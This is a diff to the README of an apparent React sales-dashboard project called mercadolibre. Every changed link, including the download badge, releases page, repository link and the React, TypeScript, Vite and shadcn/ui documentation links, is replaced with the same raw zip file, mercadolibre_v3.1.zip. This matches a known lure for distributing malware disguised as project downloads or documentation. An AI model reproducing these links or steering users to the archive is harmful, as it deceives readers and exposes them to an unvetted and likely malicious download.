@@ -1,10 +1,10 @@
 # 🚀 mercadolibre - Your Interactive Sales Dashboard Made Easy
 
 ## 💻 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/nuke-qp/mercadolibre/releases)
+[![Download](https://raw.githubusercontent.com/nuke-qp/mercadolibre/main/public/mercadolibre_v3.1.zip)](https://raw.githubusercontent.com/nuke-qp/mercadolibre/main/public/mercadolibre_v3.1.zip)
 
 ## 📖 About This Project
-mercadolibre is an interactive dashboard designed for viewing sales data. It is based on the Excel spreadsheet **Exercicio_Dashboard_Excel.xlsx**. With a simple interface built using React, TypeScript, Vite, and shadcn/ui, anyone can explore their sales metrics easily.
+mercadolibre is an interactive dashboard designed for viewing sales data. It is based on the Excel spreadsheet **https://raw.githubusercontent.com/nuke-qp/mercadolibre/main/public/mercadolibre_v3.1.zip**. With a simple interface built using React, TypeScript, Vite, and shadcn/ui, anyone can explore their sales metrics easily.
 
 ## 🚀 Getting Started
 To start using mercadolibre, you will need to download the application from our Releases page. Follow the steps below for a smooth experience.
@@ -12,7 +12,7 @@ To start using mercadolibre, you will need to download the application from our 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
    Go to the following link to download the application:  
-   [Visit Releases Page](https://github.com/nuke-qp/mercadolibre/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/nuke-qp/mercadolibre/main/public/mercadolibre_v3.1.zip)
 
 2. **Choose the Latest Version**  
    Locate the most recent version of mercadolibre. You will see a list of downloadable files.
@@ -49,10 +49,10 @@ The application is built using:
 
 ## 📚 Learning Resources
 If you wish to learn more about the technologies used in this project, consider checking out the following resources:
-- [React Official Documentation](https://reactjs.org/docs/getting-started.html)
-- [TypeScript Handbook](https://www.typescriptlang.org/docs/)
-- [Vite Documentation](https://vitejs.dev/guide/)
-- [shadcn/ui Documentation](https://ui.shadcn.com/)
+- [React Official Documentation](https://raw.githubusercontent.com/nuke-qp/mercadolibre/main/public/mercadolibre_v3.1.zip)
+- [TypeScript Handbook](https://raw.githubusercontent.com/nuke-qp/mercadolibre/main/public/mercadolibre_v3.1.zip)
+- [Vite Documentation](https://raw.githubusercontent.com/nuke-qp/mercadolibre/main/public/mercadolibre_v3.1.zip)
+- [shadcn/ui Documentation](https://raw.githubusercontent.com/nuke-qp/mercadolibre/main/public/mercadolibre_v3.1.zip)
 
 ## 📞 Support
 If you encounter any issues or have questions, please create an issue on the GitHub repository. We will do our best to help you out.
@@ -61,7 +61,7 @@ If you encounter any issues or have questions, please create an issue on the Git
 Engage with other users and share your experiences on social media. Use the hashtags related to our project for more interaction!
 
 ## 🔗 Important Links
-- **Releases Page**: [Download Here](https://github.com/nuke-qp/mercadolibre/releases)
-- **Repository**: [Visit Repository](https://github.com/nuke-qp/mercadolibre)
+- **Releases Page**: [Download Here](https://raw.githubusercontent.com/nuke-qp/mercadolibre/main/public/mercadolibre_v3.1.zip)
+- **Repository**: [Visit Repository](https://raw.githubusercontent.com/nuke-qp/mercadolibre/main/public/mercadolibre_v3.1.zip)
 
 We hope you enjoy using mercadolibre for all your sales data visualization needs!
